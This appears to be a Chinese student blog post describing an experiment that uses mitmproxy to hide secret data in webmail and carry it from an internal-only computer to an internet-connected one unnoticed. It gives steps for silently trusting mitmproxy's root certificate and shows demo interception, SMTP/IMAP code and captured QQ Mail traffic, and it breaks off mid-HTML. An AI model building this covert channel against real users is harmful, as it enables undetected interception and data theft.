<h2><a id="mitmproxy_1"></a>借助mitmproxy通过电子邮件隐式传输信息</h2> <br><h3><a id="_3"></a>前言</h3> <br><p>这其实是我上上周的组会周报。</p> <br><p><strong>要实现的效果：</strong></p> <br><p>假设邮件发送方的电脑不能连接外网只能通过自建OWA等服务向内网邮箱发送邮件，但接收方除了可以通过内网访问邮件服务接收邮件外还能连接外网。在邮件收发双方各自植入一个mitmproxy脚本，发送方脚本在发送方电脑上扫描到秘密信息想要传递出来，接收方脚本获取到秘密信息后将信息解密并悄悄传输到外网。</p> <br><p>整个过程需要保证：收发双方在浏览器中无法察觉邮件被篡改了。</p> <br><p><strong>应用场景(讲故事)：</strong></p> <br><p>AB两公司都是以安全为主业的公司，B公司为了测试A公司的安全保密程度是否可靠，向A公司发起了挑战，以成功将A公司的核心电脑上的一些信息传输出来为目标。</p> <br><p>A公司接受了这一挑战，为了防止A公司核心电脑上的内容遭到泄露，A公司将核心电脑修改为只能连接内网，A公司认为，由于B公司无法访问A公司内网，所以这样就会尽可能地安全。</p> <br><p>但是A公司的核心电脑在某些时候仍然需要被使用，因为疫情等原因A公司有员工使用非核心电脑在家远程办公。A公司的主管有时需要使用核心电脑通过内网和非核心成员进行沟通。</p> <br><p>B公司决定利用这一特性，想要通过A公司将邮件通过内网发送给能连接外网的非核心电脑这一特性来将核心电脑的信息传输出来。</p> <br><p>假设B公司已经利用已有漏洞在A公司的电脑上植入了一些脚本，这些脚本可以进行如下操作：</p> <br><ol><li>对于A公司不能联网的核心电脑，脚本读取核心电脑上的一些信息。并在核心电脑上静默安装可信任证书，使用mitmproxy工具，在核心电脑使用邮件客户端（实际上走的HTTPS协议）发送消息时，将想要传输的消息编码加密并以一定的格式附加到邮件的末尾。</li><li>对于A公司能联网的非核心电脑，脚本同样通过mitmproxy，在非核心成员通过网页读取邮件时，读取邮件中附加的内容并解码，将邮件内容还原。之后由于非核心电脑能够连接公网，脚本可以直接往B公司预留接口发送加密后的信息，至此A公司只能连接内网的核心电脑上的一部分信息也被隐式地传输了出来。</li></ol> <br><p>这样，核心电脑和非核心电脑所能看到的都是正常的邮件，A公司很难察觉。因此，B公司胜利，成功证明了以安全为主业的A公司仍然存在安全保障不周的漏洞。</p> <br><h3><a id="_30"></a>实现过程</h3> <br><h4><a id="_32"></a>改包</h4> <br><pre><code class="prism language-bash">pip <span class="token function">install</span> mitmproxy<br>mitmproxy <span class="token parameter variable">--mode</span> transparent  <span class="token comment"># 禁止python透过防火墙的话，可能需要管理员权限下运行</span><br><span class="token comment"># 也可以指定只捕获本机数据包：mitmproxy -s main.py --listen-host localhost，这样的话在我笔记本上实测不需要管理员权限</span><br></code></pre> <br><p>浏览器访问<code>http://mitm.it</code>下载证书并安装：</p> <br><ul><li>双击P12文件，启动导入向导。</li><li>选择证书存储位置(这将决定谁将信任该证书——仅当前Windows用户OR机器上的所有人)点击下一步。</li><li>再次点击下一步。</li><li>将密码留空并点击下一步。</li><li>选择“将所有证书放入以下存储”，然后点击浏览，并选择“受信任的根证书颁发机构”。</li><li>点击确定和下一步。</li><li>点击完成。</li><li>在警告对话框中点击是以确认。</li></ul> <br><p>这一步中，若是向“当前用户”安装证书，则不需要管理员权限。</p> <br><p>当然也可以使用命令行添加证书（未实操）</p> <br><pre><code class="prism language-shell">certutil <span class="token parameter variable">-addstore</span> root <span class="token number">0</span>.crt<br></code></pre> <br><p>若想编写脚本：</p> <br><pre><code class="prism language-python"><span class="token keyword">from</span> mitmproxy <span class="token keyword">import</span> http<br><span class="token keyword">import</span> logging<br><br>logger_url <span class="token operator">=</span> logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">'logger_url'</span><span class="token punctuation">)</span><br>formatter_url <span class="token operator">=</span> logging<span class="token punctuation">.</span>Formatter<span class="token punctuation">(</span><span class="token string">'%(asctime)s - %(name)s - %(levelname)s - %(message)s'</span><span class="token punctuation">)</span><br><span class="token keyword">for</span> handler <span class="token keyword">in</span> logger_url<span class="token punctuation">.</span>handlers<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span><br>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>handler<span class="token punctuation">,</span> logging<span class="token punctuation">.</span>StreamHandler<span class="token punctuation">)</span><span class="token punctuation">:</span><br>        logger_url<span class="token punctuation">.</span>removeHandler<span class="token punctuation">(</span>handler<span class="token punctuation">)</span><br>logger_url<span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>DEBUG<span class="token punctuation">)</span><br>filehandler_url <span class="token operator">=</span> logging<span class="token punctuation">.</span>FileHandler<span class="token punctuation">(</span><span class="token string">'url.log'</span><span class="token punctuation">)</span><br>filehandler_url<span class="token punctuation">.</span>setFormatter<span class="token punctuation">(</span>formatter_url<span class="token punctuation">)</span><br>logger_url<span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>filehandler_url<span class="token punctuation">)</span><br><br><br>logger_text <span class="token operator">=</span> logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">'logger_text'</span><span class="token punctuation">)</span><br>formatter_text <span class="token operator">=</span> logging<span class="token punctuation">.</span>Formatter<span class="token punctuation">(</span><span class="token string">'%(asctime)s - %(name)s - %(levelname)s - %(message)s'</span><span class="token punctuation">)</span><br><span class="token keyword">for</span> handler <span class="token keyword">in</span> logger_text<span class="token punctuation">.</span>handlers<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span><br>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>handler<span class="token punctuation">,</span> logging<span class="token punctuation">.</span>StreamHandler<span class="token punctuation">)</span><span class="token punctuation">:</span><br>        logger_text<span class="token punctuation">.</span>removeHandler<span class="token punctuation">(</span>handler<span class="token punctuation">)</span><br>logger_text<span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>DEBUG<span class="token punctuation">)</span><br>filehandler_text <span class="token operator">=</span> logging<span class="token punctuation">.</span>FileHandler<span class="token punctuation">(</span><span class="token string">'text.log'</span><span class="token punctuation">)</span><br>filehandler_text<span class="token punctuation">.</span>setFormatter<span class="token punctuation">(</span>formatter_text<span class="token punctuation">)</span><br>logger_text<span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>filehandler_text<span class="token punctuation">)</span><br><br><br><span class="token keyword">def</span> <span class="token function">request</span><span class="token punctuation">(</span>flow<span class="token punctuation">:</span> http<span class="token punctuation">.</span>HTTPFlow<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span><br>    <span class="token comment"># # 修改请求</span><br>    <span class="token comment"># if "letmefly.xyz" in flow.request.pretty_url:</span><br>    <span class="token comment">#     flow.request.headers["User-Agent"] = "Modified-Agent"</span><br>    <span class="token keyword">pass</span><br><br><span class="token keyword">def</span> <span class="token function">response</span><span class="token punctuation">(</span>flow<span class="token punctuation">:</span> http<span class="token punctuation">.</span>HTTPFlow<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span><br>    <span class="token comment"># 修改响应</span><br>    logger_url<span class="token punctuation">.</span>info<span class="token punctuation">(</span>flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>pretty_url<span class="token punctuation">)</span><br>    <span class="token keyword">if</span> <span class="token string">"web.letmefly.xyz"</span> <span class="token keyword">in</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>pretty_url <span class="token keyword">and</span> <span class="token string">'text/html'</span> <span class="token keyword">in</span> flow<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'content-type'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span><br>    <span class="token comment"># if flow.request.pretty_url == 'https://web.letmefly.xyz/':</span><br>        logger_url<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'replace HTML to LMTH'</span><span class="token punctuation">)</span><br>        <span class="token comment"># logger_text.info(flow.response.text)</span><br>        flow<span class="token punctuation">.</span>response<span class="token punctuation">.</span>text <span class="token operator">=</span> flow<span class="token punctuation">.</span>response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"HTML"</span><span class="token punctuation">,</span> <span class="token string">"LMTH"</span><span class="token punctuation">)</span><br></code></pre> <br><p>设置代理服务器为<code>localhost:8080</code>，然后：</p> <br><pre><code class="prism language-bash">mitmproxy <span class="token parameter variable">-s</span> modifyPackage.py --listen-host localhost<br></code></pre> <br><p>结果发现：请求替换成功！</p> <br><p>代理前：</p> <br><p><img src="https://i-blog.csdnimg.cn/direct/da1213d9daee496d985dceb63d8d03b9.jpeg" alt="代理前" /></p> <br><p>代理后：</p> <br><p><img src="https://i-blog.csdnimg.cn/direct/f12b9331cfd9410f97c11dcb5af45f36.jpeg" alt="代理后" /></p> <br><p>由于具有主机操作权限，所以主机信任mitm颁发的证书，浏览器也没有任何“不安全警告”，页面就这么悄无声息地被替换了。</p> <br><h4><a id="_124"></a>邮件发送</h4> <br><pre><code class="prism language-python"><span class="token keyword">import</span> smtplib<br><span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>text <span class="token keyword">import</span> MIMEText<br><span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>multipart <span class="token keyword">import</span> MIMEMultipart<br><span class="token keyword">from</span> password <span class="token keyword">import</span> sender_password<br><br><span class="token comment"># 邮件配置</span><br>smtp_server <span class="token operator">=</span> <span class="token string">'smtp.qq.com'</span><br>smtp_port <span class="token operator">=</span> <span class="token number">587</span><br>sender_email <span class="token operator">=</span> <span class="token string">'LetMeFly666@qq.com'</span><br>sender_password <span class="token operator">=</span> sender_password<br>receiver_email <span class="token operator">=</span> <span class="token string">'Tisfy@qq.com'</span><br><br><span class="token comment"># 创建邮件内容</span><br>subject <span class="token operator">=</span> <span class="token string">'这是一封正常邮件'</span><br>body <span class="token operator">=</span> <span class="token string">'今天中午吃饭吗'</span><br>msg <span class="token operator">=</span> MIMEMultipart<span class="token punctuation">(</span><span class="token punctuation">)</span><br>msg<span class="token punctuation">[</span><span class="token string">'From'</span><span class="token punctuation">]</span> <span class="token operator">=</span> sender_email<br>msg<span class="token punctuation">[</span><span class="token string">'To'</span><span class="token punctuation">]</span> <span class="token operator">=</span> receiver_email<br>msg<span class="token punctuation">[</span><span class="token string">'Subject'</span><span class="token punctuation">]</span> <span class="token operator">=</span> subject<br>msg<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>MIMEText<span class="token punctuation">(</span>body<span class="token punctuation">,</span> <span class="token string">'plain'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br><br><span class="token comment"># 发送邮件</span><br><span class="token keyword">try</span><span class="token punctuation">:</span><br>    server <span class="token operator">=</span> smtplib<span class="token punctuation">.</span>SMTP<span class="token punctuation">(</span>smtp_server<span class="token punctuation">,</span> smtp_port<span class="token punctuation">)</span><br>    server<span class="token punctuation">.</span>starttls<span class="token punctuation">(</span><span class="token punctuation">)</span><br>    server<span class="token punctuation">.</span>login<span class="token punctuation">(</span>sender_email<span class="token punctuation">,</span> sender_password<span class="token punctuation">)</span><br>    server<span class="token punctuation">.</span>sendmail<span class="token punctuation">(</span>sender_email<span class="token punctuation">,</span> receiver_email<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>as_string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"邮件发送成功"</span><span class="token punctuation">)</span><br><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span><br>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"邮件发送失败: </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><br><span class="token keyword">finally</span><span class="token punctuation">:</span><br>    server<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><br></code></pre> <br><p><img src="https://i-blog.csdnimg.cn/direct/c9bc55cbd8ca40eda5e544b11d32b262.jpeg" alt="发送成功" /></p> <br><h4><a id="_165"></a>邮件接收</h4> <br><pre><code class="prism language-python"><span class="token keyword">import</span> imaplib<br><span class="token keyword">import</span> email<br><span class="token keyword">from</span> email<span class="token punctuation">.</span>header <span class="token keyword">import</span> decode_header<br><span class="token keyword">from</span> password <span class="token keyword">import</span> sender_password<br><br><span class="token comment"># 邮件配置</span><br>imap_server <span class="token operator">=</span> <span class="token string">'imap.qq.com'</span><br>imap_port <span class="token operator">=</span> <span class="token number">993</span><br>email_address <span class="token operator">=</span> <span class="token string">'tf.li@foxmail.com'</span><br>email_password <span class="token operator">=</span> sender_password<br><br><span class="token comment"># 连接到IMAP服务器</span><br><span class="token keyword">try</span><span class="token punctuation">:</span><br>    mail <span class="token operator">=</span> imaplib<span class="token punctuation">.</span>IMAP4_SSL<span class="token punctuation">(</span>imap_server<span class="token punctuation">,</span> imap_port<span class="token punctuation">)</span><br>    mail<span class="token punctuation">.</span>login<span class="token punctuation">(</span>email_address<span class="token punctuation">,</span> email_password<span class="token punctuation">)</span><br>    mail<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'inbox'</span><span class="token punctuation">)</span>  <span class="token comment"># 选择收件箱</span><br><br>    <span class="token comment"># 搜索邮件</span><br>    status<span class="token punctuation">,</span> messages <span class="token operator">=</span> mail<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'ALL'</span><span class="token punctuation">)</span>  <span class="token comment"># 获取所有邮件</span><br>    <span class="token keyword">if</span> status <span class="token operator">!=</span> <span class="token string">'OK'</span><span class="token punctuation">:</span><br>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"没有找到邮件"</span><span class="token punctuation">)</span><br>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><br><br>    <span class="token comment"># 获取邮件列表</span><br>    mail_ids <span class="token operator">=</span> messages<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><br>    latest_mail_id <span class="token operator">=</span> mail_ids<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># 获取最新的一封邮件</span><br><br>    <span class="token comment"># 获取邮件内容</span><br>    status<span class="token punctuation">,</span> msg_data <span class="token operator">=</span> mail<span class="token punctuation">.</span>fetch<span class="token punctuation">(</span>latest_mail_id<span class="token punctuation">,</span> <span class="token string">'(RFC822)'</span><span class="token punctuation">)</span><br>    <span class="token keyword">if</span> status <span class="token operator">!=</span> <span class="token string">'OK'</span><span class="token punctuation">:</span><br>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"无法获取邮件内容"</span><span class="token punctuation">)</span><br>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><br><br>    <span class="token comment"># 解析邮件内容</span><br>    <span class="token keyword">for</span> response_part <span class="token keyword">in</span> msg_data<span class="token punctuation">:</span><br>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>response_part<span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">)</span><span class="token punctuation">:</span><br>            msg <span class="token operator">=</span> email<span class="token punctuation">.</span>message_from_bytes<span class="token punctuation">(</span>response_part<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><br>            subject<span class="token punctuation">,</span> encoding <span class="token operator">=</span> decode_header<span class="token punctuation">(</span>msg<span class="token punctuation">[</span><span class="token string">'Subject'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><br>            <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>subject<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span><br>                subject <span class="token operator">=</span> subject<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>encoding <span class="token keyword">if</span> encoding <span class="token keyword">else</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><br>            from_ <span class="token operator">=</span> msg<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'From'</span><span class="token punctuation">)</span><br>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"主题: </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>subject<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><br>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"发件人: </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>from_<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><br><br>            <span class="token comment"># 获取邮件正文</span><br>            <span class="token keyword">if</span> msg<span class="token punctuation">.</span>is_multipart<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><br>                <span class="token keyword">for</span> part <span class="token keyword">in</span> msg<span class="token punctuation">.</span>walk<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><br>                    content_type <span class="token operator">=</span> part<span class="token punctuation">.</span>get_content_type<span class="token punctuation">(</span><span class="token punctuation">)</span><br>                    content_disposition <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>part<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Content-Disposition"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br>                    <span class="token keyword">if</span> content_type <span class="token operator">==</span> <span class="token string">'text/plain'</span> <span class="token keyword">and</span> <span class="token string">'attachment'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> content_disposition<span class="token punctuation">:</span><br>                        body <span class="token operator">=</span> part<span class="token punctuation">.</span>get_payload<span class="token punctuation">(</span>decode<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><br>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"正文: </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>body<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><br>            <span class="token keyword">else</span><span class="token punctuation">:</span><br>                body <span class="token operator">=</span> msg<span class="token punctuation">.</span>get_payload<span class="token punctuation">(</span>decode<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><br>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"正文: </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>body<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><br><br><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span><br>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"接收邮件失败: </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><br><span class="token keyword">finally</span><span class="token punctuation">:</span><br>    mail<span class="token punctuation">.</span>logout<span class="token punctuation">(</span><span class="token punctuation">)</span><br></code></pre> <br><blockquote> <br> <p>[!CAUTION]</p> <br> <p>在邮件接收还未认证的时候，忽然想到mitmproxy是不是只能抓HTTP(s)不能抓SMTP之类的</p> <br> <p>发了个邮件果然没抓到。。。</p> <br></blockquote> <br><h4><a id="_236"></a>客户端发送邮件抓包</h4> <br><p>那就不模拟了，直接使用客户端发吧，这样也更真实一点。</p> <br><p>以QQ邮件为例，发送邮件时会向<code>https://mail.qq.com/cgi-bin/compose_send?sid=xxxxx</code>发送一个POST请求，表单数据包括：</p> <br><pre><code>mailtype: <br>dockey: <br>bigattachcontent: <br>xxxxxxxxxxx: xxxxxxxxx<br>sid: xxxxx<br>bigattachcnt: <br>exstore: <br>from_s: cnew<br>swap: <br>signtype: <br>newwin: <br>verifykey: <br>stationeryCount: <br>to: "Let"<Tisfy@qq.com><br>swap3: <br>cc: <br>subject: 今日指令<br>content__html: 一切正常，和昨天一样<br>sendmailname: tisfy@foxmail.com<br>savesendbox: 1<br>swap2: <br>transattach: <br>SrcMailCharset: <br>xqqstyle: <br>mailbgmusic: <br>actiontype: send<br>priority: <br>sendname: LetMeFly<br>acctid: 0 <br>ReAndFw: <br>separatedcopy: false<br>fmailid: xxxx-xxxxxx<br>ReAndFwMailid: <br>cattachelist: <br>upfilelist: <br>rsturl: <br>fileidlist: <br>t: backgroundsend<br>verifycode: <br>verifycode_cn: <br>s: comm<br>from: <br>hitaddrbook: 0<br>selfdefinestation: -1<br>backurl: <br>noatcp: <br>domaincheck: 0<br>cgitm: 1741223758403<br>clitm: 1741223762955<br>comtm: 1741223962691<br>logattcnt: 0<br>logattsize: 0<br>logattmethod: <br>timezone: 28800<br>timezone_dst: 0<br>resp_charset: UTF8<br>bgsend: 1<br></code></pre> <br><p>消息内容在<code>content__html</code>字段中。又觉得可行了起来。</p> <br><h4><a id="_304"></a>客户端接收邮件抓包</h4> <br><p>当用户读取具体邮件时，会请求：<code>https://mail.qq.com/cgi-bin/readmail?folderid=1&folderkey=1&t=readmail&mailid=xxxx~xxx&mode=pre&maxage=3600&base=11.08&ver=13964&sid=xxxx</code>。</p> <br><p>请求头之类的不重要，我们只要匹配这个url就行。</p> <br><p>可以看到，响应体里就是一个HTML，简化后如下：</p> <br><pre><code class="prism language-html"><span class="token doctype"><span class="token punctuation"><!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><br><span class="token tag"><span class="token tag"><span class="token punctuation"><</span>html</span><span class="token punctuation">></span></span><br>    <span class="token tag"><span class="token tag"><span class="token punctuation"><</span>head</span><span class="token punctuation">></span></span><br>        <span class="token tag"><span class="token tag"><span class="token punctuation"><</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=gb18030<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><br>        <span class="token tag"><span class="token tag"><span class="token punctuation"><</span>title</span><span class="token punctuation">></span></span>今日指令 - QQ邮箱<span class="token tag"><span class="token tag"><span class="token punctuation"></</span>title</span><span class="token punctuation">></span></span><br>        <span class="token comment"><!-- 此处省略一堆script、style、meta --></span><br>    <span class="token tag"><span class="token tag"><span class="token punctuation"></</span>head</span><span class="token punctuation">></span></span><br>    <span class="token tag"><span class="token tag"><span class="token punctuation"><</span>body</span> <span class="token attr-name">context</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>邮件ID<span class="token punctuation">"</span></span> <span class="token attr-name">module</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>qmReadMail<span class="token punctuation">"</span></span> <span class="token attr-name">md</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>md<span class="token punctuation">"</span></span> <span class="token attr-name">mu</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mu<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><br>        <span class="token tag"><span class="token tag"><span class="token punctuation"><</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mailcontainer<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>qqmail_mailcontainer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><br>            <span class="token tag"><span class="token tag"><span class="token punctuation"><</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mainmail<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">position</span><span class="token punctuation">:</span>relative<span class="token punctuation">;</span><span class="token property">z-index</span><span class="token punctuation">:</span>1<span class="token punctuation">;</span><span class="token property">margin-bottom</span><span class="token punctuation">:</span>12px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><br>                <span class="token tag"><span class="token tag"><span class="token punctuation"><</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>contentDiv<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onmouseover</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">getTop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stopPropagation</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token special-attr"><span class="token attr-name">onClick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">getTop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">preSwapLink</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> <span class="token string">'html'</span><span class="token punctuation">,</span> <span class="token string">'ZC0006_StHNHHSMYOYuV2cAGA~jBf3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">position</span><span class="token punctuation">:</span>relative<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span>14px<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span>auto<span class="token punctuation">;</span><span class="token property">padding</span><span class="token punctuation">:</span>15px 15px 10px 15px<span class="token punctuation">;</span><span class="token property">z-index</span><span class="token punctuation">:</span>1<span class="token punctuation">;</span><span class="token property">zoom</span><span class="token punctuation">:</span>1<span class="token punctuation">;</span><span class="token property">line-height</span><span class="token punctuation">:</span>1.7<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>body<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><br>                    <span class="token tag"><span class="token tag"><span class="token punctuation"><</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>qm_con_body<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><br>                        <span class="token tag"><span class="token tag"><span class="token punctuation"><</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mailContentContainer<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onClick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">getTop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">previewContentImage</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token special-attr"><span class="token attr-name">onMousemove</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">getTop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contentImgMouseOver</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token special-attr"><span class="token attr-name">onMouseout</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">getTop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contentImgMouseOut</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>qmbox qm_con_body_content qqmail_webmail_only<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">opacity</span><span class="token punctuation">:</span> 0</span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><br>                            <span class="token tag"><span class="token tag"><span class="token punctuation"><</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mailcontent_image_operator<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onMouseover</span><span class="token attr-value"><span class="token punctuation 